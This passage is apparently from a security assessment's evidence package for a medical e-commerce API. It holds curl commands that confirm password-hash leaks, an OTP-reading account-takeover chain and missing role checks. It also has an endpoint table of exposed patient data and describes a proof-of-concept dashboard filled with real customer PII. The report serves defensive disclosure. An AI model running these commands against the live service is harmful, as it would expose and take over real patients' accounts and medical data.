import json,sys; d=json.load(sys.stdin)
print(f'Status: {\"VULNERABLE\" if d.get(\"total\",0) > 0 else \"FIXED\"}')"
```

### Verify F-02 (PATCH Hash Leak)
```bash
# Get a user ID first
ID=$(curl -s "https://api.medbasket.com/users?\$limit=1&\$select[]=_id" | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['data'][0]['_id'])")
# PATCH it
curl -s -X PATCH "https://api.medbasket.com/users/$ID" \
  -H "Content-Type: application/json" -d '{}' | grep -c "password"
# Output > 0 = VULNERABLE
```

### Verify F-03/F-04 (OTP Chain)
```bash
# Request OTP
curl -s -X POST "https://api.medbasket.com/users/request-otp" \
  -H "Content-Type: application/json" -d '{"phoneNumber":"+91XXXXXXXXXX"}'
# Read OTP
curl -s "https://api.medbasket.com/users?phoneNumber=%2B91XXXXXXXXXX&\$select[]=phoneOtp"
# If phoneOtp is non-null = VULNERABLE
```

### Verify F-05 (Orders Without RBAC)
```bash
# Use any valid JWT (from F-03)
curl -s "https://api.medbasket.com/super-admin-users/orders?\$limit=1" \
  -H "Authorization: Bearer <TOKEN>" | python3 -c "
import json,sys; d=json.load(sys.stdin)
print(f'Status: {\"VULNERABLE\" if d.get(\"total\",0) > 0 else \"FIXED\"}')"
```

### Verify F-06 (Dashboard)
```bash
curl -s "https://api.medbasket.com/dashboard" \
  -H "Authorization: Bearer <TOKEN>" | python3 -c "
import json,sys; d=json.load(sys.stdin)
print(f'Status: {\"VULNERABLE\" if \"revenueStat\" in d else \"FIXED\"}')"
```

### Verify F-08 (Swagger)
```bash
curl -s -o /dev/null -w "%{http_code}" "https://api.medbasket.com/swagger.json"
# 200 = VULNERABLE, 404 = FIXED
```

---

## Endpoint Access Matrix

Complete mapping of all tested endpoints and their access levels:

### No Authentication Required (CRITICAL)

| Endpoint | Method | Records | Data Type |
|----------|--------|---------|-----------|
| `/users` | GET | 188,147 | User PII, OTPs, reset tokens |
| `/users/{id}` | PATCH | per-user | Password hashes, Mongoose internals |
| `/products` | GET | catalog | Product data, S3 URLs with AWS keys |
| `/payment` | GET | 0 | Payment schema |
| `/attachments` | GET | 98,390 | S3 file URLs |
| `/app-data` | GET | 123 | App configuration |
| `/admin-zip-codes` | GET/POST | 19,794 | Delivery zones + GPS |
| `/zip-codes` | GET | accessible | Delivery zones |
| `/taxes` | GET | accessible | Tax configuration |
| `/swagger.json` | GET | 300+ paths | Full API spec |
| `/docs` | GET | n/a | Swagger UI |
| `/webhooks` | GET/POST | accessible | Webhook config |
| `/contact-us` | GET | accessible | Support submissions |
| `/policies` | GET | accessible | Business policies |
| `/bulk-upload` | GET | accessible | Upload interface |
| `/consumer/categories` | GET | accessible | Categories |
| `/consumer/navigations` | GET | accessible | Nav structure |
| `/users/request-otp` | POST | n/a | OTP generation |
| `/users/reset-password` | POST | n/a | Reset record creation |
| `/request-super-admin-otp` | POST | n/a | Admin OTP generation |
| `/admin-zip-codes` | POST | n/a | Admin data injection |

### Any Authenticated User (HIGH — No Role Check)

| Endpoint | Method | Records | Data Type |
|----------|--------|---------|-----------|
| `/super-admin-users/orders` | GET | 62,880 | Orders + addresses + GPS |
| `/dashboard` | GET | live | Revenue, customers, recent orders |
| `/medicine-requests` | GET | 6,655 | Medical requests + prescriptions |
| `/medicine-remainder` | GET | 708 | Medicine reminders |
| `/referral-credits` | GET | 102 | Financial data |
| `/membership-orders` | GET | 13 | Membership purchases |
| `/memberships` | GET | accessible | Membership data |
| `/carts` | GET | accessible | Cart data |
| `/notifications` | GET | accessible | Notifications |
| `/tickets` | GET | accessible | Support tickets |
| `/patients` | GET | user-scoped | Patient data |
| `/consultations` | GET | user-scoped | Medical consultations |
| `/order` | GET | user-scoped | User orders |
| `/user-addresses` | GET | user-scoped | User addresses |

### Requires Admin Lookup (returns 404 for non-admin JWT)

| Endpoint | Verified With |
|----------|---------------|
| `/super-admin-users` | Both JWTs → 404 |
| `/roles` | Both JWTs → 404 |
| `/permissions` | Both JWTs → 404 |
| `/stores` | Both JWTs → 404 |
| `/settings` | Both JWTs → 404 |
| `/categories` (admin) | Both JWTs → 404 |
| `/sales` | Both JWTs → 404 |
| `/collections` | Both JWTs → 404 |
| `/navigations` | Both JWTs → 404 |
| `/logistics` | Both JWTs → 404 |
| `/store-inventory` | Both JWTs → 404 |
| `/app-logs` | Both JWTs → 404 |

---

## Signatures

```
Assessment conducted by: ____________________________

Date: 2026-02-18

Authorization reference: ____________________________

Client representative: ____________________________

Supply chain verifier: ____________________________
```

---

<a id="visual-poc-dashboard"></a>
## Visual PoC Dashboard

A static HTML dashboard (`poc_dashboard.html`) was generated on 2026-02-18 containing embedded live data from the production API:

| Dataset | Records Embedded | Total Available |
|---------|-----------------|-----------------|
| Orders | 100 | 62,906 |
| Users | 100 | 188,000+ |
| Medicine Requests | 50 | 6,655 |

### Data Embedded Per Order Record

- Order ID, date, status, payment amount
- **Customer name** (PII)
- **Phone number** (PII)
- **Full delivery address** (PII)
- **GPS coordinates** (latitude, longitude) (PII)
- **Alternate phone number** (PII)
- Postal code, city, state
- Payment mode, coupon code, store details
- Prescription status, delivery mode, device type

### Data Embedded Per User Record

- User ID, email, phone number
- Date of birth, gender
- **Phone OTP** (live — enables account takeover)
- **Password reset token** (enables password reset)
- Account creation date

### Generation Command

```bash
python3 poc/build_dashboard.py
# Fetches live data from api.medbasket.com
# Outputs: poc/poc_dashboard.html
# Open directly in any browser — no server needed
```

### Purpose

The visual dashboard demonstrates the impact of the findings in a format accessible to non-technical stakeholders. It shows real customer data (names, addresses, phone numbers, GPS coordinates) in a browsable interface, making the severity immediately apparent without requiring terminal access.

---

## Signatures

```
Assessment conducted by: ____________________________

Date: 2026-02-18

Authorization reference: ____________________________

Client representative: ____________________________

Supply chain verifier: ____________________________
```

---

*End of evidence package.*
